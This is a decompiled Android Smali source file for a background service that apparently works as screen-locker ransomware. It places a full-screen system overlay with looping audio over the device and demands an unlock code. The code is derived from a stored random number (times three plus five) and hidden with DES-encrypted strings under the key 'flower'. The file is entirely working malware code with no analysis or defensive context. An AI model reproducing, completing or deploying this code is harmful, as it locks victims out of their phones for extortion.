.class public Lcom/h/s;
.super Landroid/app/Service;
.source "s.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/h/s$100000000;,
        Lcom/h/s$100000001;
    }
.end annotation


# instance fields
.field bt:Landroid/widget/Button;

.field des:Lcom/h/DU;

.field ed:Landroid/widget/EditText;

.field editor:Landroid/content/SharedPreferences$Editor;

.field private mFloatLayout:Landroid/view/View;

.field private mWindowManager:Landroid/view/WindowManager;

.field pass:J

.field passw:Ljava/lang/Long;

.field password:Ljava/lang/String;

.field ppss:Ljava/lang/String;

.field share:Landroid/content/SharedPreferences;

.field tv:Landroid/widget/TextView;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 222
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$L1000001(Lcom/h/s;)Landroid/view/WindowManager;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000002(Lcom/h/s;)Landroid/view/View;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$S1000001(Lcom/h/s;Landroid/view/WindowManager;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic access$S1000002(Lcom/h/s;Landroid/view/View;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    return-void
.end method

.method private c()V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 125
    move-object v0, p0

    move-object v6, v0

    new-instance v7, Landroid/view/WindowManager$LayoutParams;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    invoke-direct {v8}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v7, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 127
    move-object v6, v0

    move-object v7, v0

    invoke-virtual {v7}, Lcom/h/s;->getApplication()Landroid/app/Application;

    move-result-object v7

    move-object v8, v0

    invoke-virtual {v8}, Lcom/h/s;->getApplication()Landroid/app/Application;

    move-result-object v8

    sget-object v8, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v7, v8}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/WindowManager;

    iput-object v7, v6, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    .line 130
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v7, 0x7da

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 138
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, 0x1

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 144
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v7, 0x500

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 151
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v7, 0x31

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 153
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, 0x0

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 154
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, 0x0

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 156
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x1

    iput v7, v6, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 157
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x1

    iput v7, v6, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 162
    move-object v6, v0

    invoke-virtual {v6}, Lcom/h/s;->getApplication()Landroid/app/Application;

    move-result-object v6

    invoke-static {v6}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v6

    move-object v2, v6

    .line 164
    move-object v6, v0

    move-object v7, v2

    const v8, 0x7f030001

    const/4 v9, 0x0

    check-cast v9, Landroid/view/ViewGroup;

    invoke-virtual {v7, v8, v9}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v7

    iput-object v7, v6, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    .line 165
    move-object v6, v0

    const/high16 v7, 0x7f060000

    invoke-static {v6, v7}, Landroid/media/MediaPlayer;->create(Landroid/content/Context;I)Landroid/media/MediaPlayer;

    move-result-object v6

    move-object v3, v6

    .line 166
    move-object v6, v3

    const/4 v7, 0x1

    invoke-virtual {v6, v7}, Landroid/media/MediaPlayer;->setLooping(Z)V

    .line 167
    move-object v6, v3

    invoke-virtual {v6}, Landroid/media/MediaPlayer;->start()V

    .line 170
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v6, v7, v8}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 171
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    const v8, 0x7f0a0002

    invoke-virtual {v7, v8}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/Button;

    iput-object v7, v6, Lcom/h/s;->bt:Landroid/widget/Button;

    .line 172
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    const/high16 v8, 0x7f0a0000

    invoke-virtual {v7, v8}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/EditText;

    iput-object v7, v6, Lcom/h/s;->ed:Landroid/widget/EditText;

    .line 173
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    const v8, 0x7f0a0001

    invoke-virtual {v7, v8}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/TextView;

    iput-object v7, v6, Lcom/h/s;->tv:Landroid/widget/TextView;

    .line 176
    move-object v6, v0

    :try_start_0
    iget-object v6, v6, Lcom/h/s;->ed:Landroid/widget/EditText;

    const-string v7, "."

    invoke-virtual {v6, v7}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 177
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->tv:Landroid/widget/TextView;

    const-string v7, "\u9675\u2605\u591c\u7ed9\u4f60\u7684\u968f\u673a\u7801:"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 181
    :goto_0
    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->bt:Landroid/widget/Button;

    new-instance v7, Lcom/h/s$100000001;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    move-object v9, v0

    invoke-direct {v8, v9}, Lcom/h/s$100000001;-><init>(Lcom/h/s;)V

    invoke-virtual {v6, v7}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 203
    move-object v6, v0

    :try_start_1
    iget-object v6, v6, Lcom/h/s;->tv:Landroid/widget/TextView;

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v8, Ljava/lang/StringBuffer;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    const-string v9, "\n"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    move-object v9, v0

    iget-object v9, v9, Lcom/h/s;->des:Lcom/h/DU;

    const-string v10, "e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c"

    invoke-virtual {v9, v10}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v9, "m"

    const/4 v10, 0x0

    int-to-long v10, v10

    invoke-interface {v8, v9, v10, v11}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v8

    invoke-virtual {v7, v8, v9}, Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_1
    return-void

    .line 177
    :catch_0
    move-exception v6

    move-object v4, v6

    goto :goto_0

    .line 203
    :catch_1
    move-exception v6

    move-object v4, v6

    goto :goto_1
.end method


# virtual methods
.method public is(Landroid/content/Context;)Z
    .locals 8

    .prologue
    .line 211
    move-object v0, p0

    move-object v1, p1

    move-object v6, v1

    if-eqz v6, :cond_0

    .line 213
    move-object v6, v1

    const-string v7, "connectivity"

    invoke-virtual {v6, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/net/ConnectivityManager;

    move-object v3, v6

    .line 215
    move-object v6, v3

    invoke-virtual {v6}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v6

    move-object v4, v6

    .line 216
    move-object v6, v4

    if-eqz v6, :cond_0

    .line 218
    move-object v6, v4

    invoke-virtual {v6}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v6

    move v0, v6

    .line 221
    :goto_0
    return v0

    :cond_0
    const/4 v6, 0x0

    move v0, v6

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 37
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v4, v0

    const-string v5, "com.aide.ui"

    invoke-static {v4, v5}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 44
    move-object v4, v0

    invoke-super {v4}, Landroid/app/Service;->onCreate()V

    .line 45
    move-object v4, v0

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v5

    const v7, 0x5f5e100

    int-to-double v7, v7

    add-double/2addr v5, v7

    double-to-long v5, v5

    iput-wide v5, v4, Lcom/h/s;->pass:J

    .line 46
    move-object v4, v0

    move-object v5, v0

    iget-wide v5, v5, Lcom/h/s;->pass:J

    const/4 v7, 0x3

    int-to-long v7, v7

    mul-long/2addr v5, v7

    const/4 v7, 0x5

    int-to-long v7, v7

    add-long/2addr v5, v7

    new-instance v7, Ljava/lang/Long;

    move-wide v10, v5

    move-object v12, v7

    move-object v5, v12

    move-wide v6, v10

    move-object v8, v12

    move-wide v10, v6

    move-object v12, v8

    move-object v6, v12

    move-wide v7, v10

    move-object v9, v12

    invoke-direct {v6, v7, v8}, Ljava/lang/Long;-><init>(J)V

    iput-object v5, v4, Lcom/h/s;->passw:Ljava/lang/Long;

    .line 48
    move-object v4, v0

    new-instance v5, Lcom/h/DU;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    const-string v7, "flower"

    invoke-direct {v6, v7}, Lcom/h/DU;-><init>(Ljava/lang/String;)V

    iput-object v5, v4, Lcom/h/s;->des:Lcom/h/DU;

    .line 51
    move-object v4, v0

    :try_start_0
    new-instance v5, Lcom/h/DU;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->des:Lcom/h/DU;

    const-string v8, "c29fe56fa59ab0db"

    invoke-virtual {v7, v8}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Lcom/h/DU;-><init>(Ljava/lang/String;)V

    iput-object v5, v4, Lcom/h/s;->des:Lcom/h/DU;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    :goto_0
    move-object v4, v0

    move-object v5, v0

    const-string v6, "Flowers"

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v7}, Lcom/h/s;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    iput-object v5, v4, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    .line 56
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    iput-object v5, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    .line 57
    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v5, "m"

    const/4 v6, 0x0

    int-to-long v6, v6

    invoke-interface {v4, v5, v6, v7}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v4

    const/4 v6, 0x0

    int-to-long v6, v6

    cmp-long v4, v4, v6

    if-nez v4, :cond_0

    .line 60
    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "m"

    move-object v6, v0

    iget-wide v6, v6, Lcom/h/s;->pass:J

    invoke-interface {v4, v5, v6, v7}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 61
    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v4

    .line 64
    move-object v4, v0

    :try_start_1
    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "passw"

    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->des:Lcom/h/DU;

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, ""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->passw:Ljava/lang/Long;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lcom/h/DU;->encrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 65
    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v4

    .line 69
    :goto_1
    move-object v4, v0

    move-object v5, v0

    invoke-virtual {v5}, Lcom/h/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v4, v5}, Lcom/h/s;->is(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 71
    move-object v4, v0

    new-instance v5, Ljava/lang/StringBuffer;

    move-object v10, v5

    move-object v5, v10

    move-object v6, v10

    invoke-direct {v6}, Ljava/lang/StringBuffer;-><init>()V

    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v7, "m"

    const/16 v8, 0x8

    int-to-long v8, v8

    invoke-interface {v6, v7, v8, v9}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v6

    invoke-virtual {v5, v6, v7}, Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;

    move-result-object v5

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/h/s;->ppss:Ljava/lang/String;

    .line 74
    move-object v4, v0

    move-object v5, v0

    :try_start_2
    iget-object v5, v5, Lcom/h/s;->des:Lcom/h/DU;

    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v7, "passw"

    const-string v8, ""

    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/h/s;->password:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 78
    :goto_2
    new-instance v4, Lcom/h/s$100000000;

    move-object v10, v4

    move-object v4, v10

    move-object v5, v10

    move-object v6, v0

    invoke-direct {v5, v6}, Lcom/h/s$100000000;-><init>(Lcom/h/s;)V

    invoke-virtual {v4}, Lcom/h/s$100000000;->start()V

    .line 98
    :cond_0
    :goto_3
    return-void

    .line 51
    :catch_0
    move-exception v4

    move-object v2, v4

    goto/16 :goto_0

    .line 65
    :catch_1
    move-exception v4

    move-object v2, v4

    goto :goto_1

    .line 74
    :catch_2
    move-exception v4

    move-object v2, v4

    goto :goto_2

    .line 95
    :cond_1
    move-object v4, v0

    :try_start_3
    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "m"

    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->des:Lcom/h/DU;

    const-string v7, "5a15e58cc8db8d1c700ecb6bb7b627a9"

    invoke-virtual {v6, v7}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    invoke-interface {v4, v5, v6, v7}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 96
    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v4

    .line 97
    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v5, "passw"

    const-string v6, "1bf745dbcc16364d700ecb6bb7b627a9"

    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 98
    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    move-result v4

    goto :goto_3

    :catch_3
    move-exception v4

    move-object v2, v4

    goto :goto_3
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Intent;",
            "I)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 110
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-object v4, v0

    move-object v5, v1

    move v6, v2

    invoke-super {v4, v5, v6}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 111
    move-object v4, v0

    invoke-direct {v4}, Lcom/h/s;->c()V

    return-void
.end method
